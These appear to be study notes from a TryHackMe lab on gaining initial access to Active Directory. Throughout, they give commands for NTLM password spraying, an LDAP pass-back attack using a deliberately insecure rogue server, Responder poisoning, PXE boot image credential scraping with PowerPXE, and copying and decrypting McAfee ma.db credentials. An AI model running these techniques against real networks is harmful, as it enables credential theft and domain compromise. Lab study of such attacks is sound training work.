Domain: thmdc.za.tryhackme.com
DC's IP Address: 10.200.92.101
Internal IP Address: 10.50.90.39
Interface: breachad

Sites about information that was involved in a data breach:

- [HaveIBeenPwned](https://haveibeenpwned.com/)
- [DeHashed](https://www.dehashed.com/)

## NTLM Authentication Services

##### NTLM and NetNTLM

New Technology LAN Manager (NTLM) is a suite of security protocols used for AD authentication.
NTLM is used by a challenge-response based scheme called NetNTLM, services that use it can also be exposed to the internet for example:

- Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal.
- Remote Desktop Protocol (RDP) service of a server being exposed to the internet.
- Exposed VPN endpoints that were integrated with AD.
- Web applications that are internet-facing and make use of NetNTLM.

All the authentication material is forwarded to the DC, the application will than authenticate the user if the challenge is successful, which means the application is authenticating in behalf of the user, this way credentials are stored in the DC and not directly in the application.

![[c9113ad0ff443dd0973736552e85aa69.png]]

##### Password Spraying

Password Spraying attack is trying 1 password with a bunch of users, can still be detected because of a lot of failed authentication attempts.

Basic python password sprayer tool:

![[passwordsprayer.zip]]

`python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>` - The command to use the tool.

## LDAP Bind Credentials

With Lightweight Directory Access Protocol (LDAP) the application stores the AD credentials pair directly, to first query LDAP and than verify the AD user's credentials.

It includes applications such as:

- GitLab
- Jenkins
- Custom-developed web applications
- Printers
- VPNs

Along with the NTLM attack avenues we can attempt to recover the AD stored credentials in the application, here is the authentication process:

![[d2f78ae2b44ef76453a80144dac86b4e.png]]

After a foothold you can attempt to recover the credentials, for example by reading configuration files.

LDAP default port: 389.

##### LDAP Pass-back Attack

An attack against network devices such as printers, when we gain access to the device's configuration where the LDAP parameters are specified, for example a web interface, the credentials are usually kept to the default like admin:admin, the password is usually hidden.

in Pass-back attack we can change the IP or hostname of the LDAP server, so the device will attempt to authenticate to our rogue device.

`nc -lvp 389` - Start a listener to test for a connection back after changing the IP in the configuration.

You should get a `supportedCapabilities` response which means the device wants to negotiate the best authentication method you both support, we will need to configure a rogue LDAP server and configure it insecurely to get the credentials in plaintext.

`sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd` - Install OpenLDAP

`sudo dpkg-reconfigure -p low slapd` - Configure the rogue server.

Options to choose:

1. No
2. Target domain
3. Same name
4. Any administrator password
5. MDB
6. No
7. Yes

Create ldif file with the following lines:

1. `#<File name>`
2. `dn: cn=config`
3. `replace: olcSaslSecProps` - Specifies the SASL security properties.
4. `olcSaslSecProps: noanonymous,minssf=0,passcred` - `noanonymous` for disabling anonymous login and `minssf` specifies the minimum security strength with 0, which means no protection.

`sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart` - Patch the LDAP server.

`ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms` - Verify that the server configuration as been applied.

`tcpdump -SX -i breachad tcp port 389` - Use tcpdump to capture the credentials.

## Authentication Relays

There are a significant amount of services talking to each other in Windows networks, which use built-in authentication method to verify the identity of incoming connections.

##### Server Message Block (SMB)

SMB governs everything from inter-network file sharing to remote administration, some old versions are insecure.

2 Exploits:

- We can intercept the NTLM challenge and crack the password offline, slower than cracking the NTLM hash.
- We can use a rogue device to relay the SMB authentication between the client and the server, which will provide us access to the server.

##### LLMNR, NBT-NS and WPAD

NetBIOS Name Service (NBT-NS) is the precursor to Link-Local Multicast Name Resolution (LLMNR) which is used to perform local DNS lookup for hosts on the local network, Web Proxy Auto-Discovery (WPAD) requests are made to try and find a proxy for future HTTP(s) connections.

[Responder](https://github.com/lgandx/Responder) allows us to perform Man-in-the-Middle attacks by poisoning the responses during NetNTLM authentication, tricking the client into talking to you instead of the server, it will attempt to poison any LLMNR, NBT-NS and WPAD requests.

Responder will send poisoned responses with our IP to broadcast messages from those protocols instead of dropping them, so the client will connect to us, it than starts servers like SMB, HTTP and SQL to capture requests and force authentication.

Poisoning requests is highly disruptive and noticeable since the users wouldn't be able to access services.

##### Intercepting NetNTLM Challenge

`responder -I <interface>` - Start Responder with the interface to use.

Now you can crack the hash you found using Hashcat.

##### Relaying the Challenge

This attack depends on the permissions of the associated account, we need those things to play in our favor:

- We need to make manor changes to the request to pass it, so we need the SMB Signing to be disabled or enabled but not enforced.
- The associated account needs the relevant permissions on the server to access the resources, ideally administrative privileges.
- Because we don't yet have foothold some guess work of which accounts will have permissions on which hosts is required, usually we will breach the AD and do some initial enumeration first.

This is unpopular method because of this, this is how it works:

![[6baba3537d36d0fa78c6f61cf1386f6f.png]]

## Microsoft Deployment Toolkit

##### MDT and SCCM

Microsoft Deployment Toolkit (MDT) assists with deploying Microsoft OSs, the base images can be maintained and updated in a central location.

MDT is usually integrated with System Center Configuration Manager (SCCM), the MDT can do the initial configuration and ensure the build is updated the first time, while SCCM manages all updates of Microsoft applications, services and operating systems.

SCCM allows the IT to review updates to all software installed across the estate, it also gives the ability to test the patches in a sandbox environment before deploying them to all the machines in the domain.

Preboot Execution Environment (PXE) boot is one of the many ways to configure MDT.

##### PXE boot

PXE boot allows new devices to download the OS directly over the network, MDT can be used to create, manage and host PXE boot images, PXE boot is usually integrated with DHCP so the host is allowed to request the PXE boot image when he gets an IP lease:

![[8117a18103e98ee2ccda91fc87c63606.png]]

The client will than use TFTP connection to download the PXE boot image, there are 2 purposes for exploiting this:

- Inject a privilege escalation vector, to gain something like administrative access when the PXE boot as been completed
- Perform password scraping attacks to recover AD credentials used during the install.

We will focus on the second and attempt to recover deployment service account associated with the MTD during installation, we might also retrieve other AD accounts which are use for unattended installation of applications and services.

##### PXE Boot Image Retrieval

For this attack you will need from DHCP the IP of the MDT server and the names of BCD files which store relevant information regarding PXE boots for different type of architectures, usually you would use TFTP to request each of the BCD files and enumerate the configuration for all of them, we will skip those steps here here.

Connect with SSH

Ensure all users of the network can use SSH:
`cd Documents`
`mkdir <your username>`
`copy C:\powerpxe <yourusername>\`
`cd <your username>`

use TFTP to download the BCD file to read the configuration of the MDT server, TFTP can't list files but the BCD files are always in the TMP directory:
`tftp -i <domain ip address> GET "\Tmp\x64{39...28}.bcd" conf.bcd`

Current file name: x64{5D89D6D5-B208-4E2B-95E0-5871B101A752}.bcd

use [powerpxe](https://github.com/wavestone-cdt/powerpxe) to read the contents of the BCD file, better to take a manual approach:

```
C:\Users\THM\Documents\Am0> powershell -executionpolicy bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.   

PS C:\Users\THM\Documents\am0> Import-Module .\PowerPXE.ps1
PS C:\Users\THM\Documents\am0> $BCDFile = "conf.bcd"
PS C:\Users\THM\Documents\am0> Get-WimFile -bcdFile $BCDFile
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : <PXE Boot Image Location>
<PXE Boot Image Location>
```

WIM files are bootable in the Windows Imaging Format, now we can use TFTP again to download the PXE boot image with the location we have.

##### Recovering Credentials from a PXE Boot Image

Now we could inject a local administrator user, we can install the image to have a domain joined machine.

We will use powerpxe again to recover the credentials, we can do this manually by extracting the image and looking for the bootstrap.ini file:

```markup
PS C:\Users\THM\Documents\am0> Get-FindCredentials -WimFile pxeboot.wim
>> Open pxeboot.wim
>>>> Finding Bootstrap.ini
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
>>>> >>>> UserID = <account>
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = <password>
```

## Configuration Files

Depending on the host breached, various configuration files might be of value to enumerate:

- Web application config files
- Service configuration files
- Registry keys
- Centrally deployed applications

Several enumeration scripts, such as [Seatbelt](https://github.com/GhostPack/Seatbelt), can be used to automate this process.
##### Configuration File Credentials

Centrally deployed applications usually need a method to authenticate to domain during the installation and execution phases, for example McAfee Enterprise Endpoint Security, that is used as endpoint detection and response tool by organizations.

McAfee embeds the credentials used during installation to connect back to the orchestrator in a file called ma.db, which can be retrieved and read with local access to the host to recover the associated AD service account, we will again use SSH.

`cd C:\ProgramData\McAfee\Agent\DB` - the directory where the ma.db file is always stored.
`scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .` - You can use `scp` to copy the file to your machine.
`sqlitebrowser ma.db` - Read the file.

Select the Browse Data option and focus on the AGENT_REPOSITORIES table, we are interested in the second entry where the DOMAIN, AUTH_USER and AUTH_PASSWD field entries are located.

Since McAfee encrypts the AUTH_PASSWD field with a known key we can use this old python2 tool (there is a newer version) to decrypt the password:

![[mcafeesitelistpwddecryption.zip]]

`python2 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>` - Decrypt the password using the tool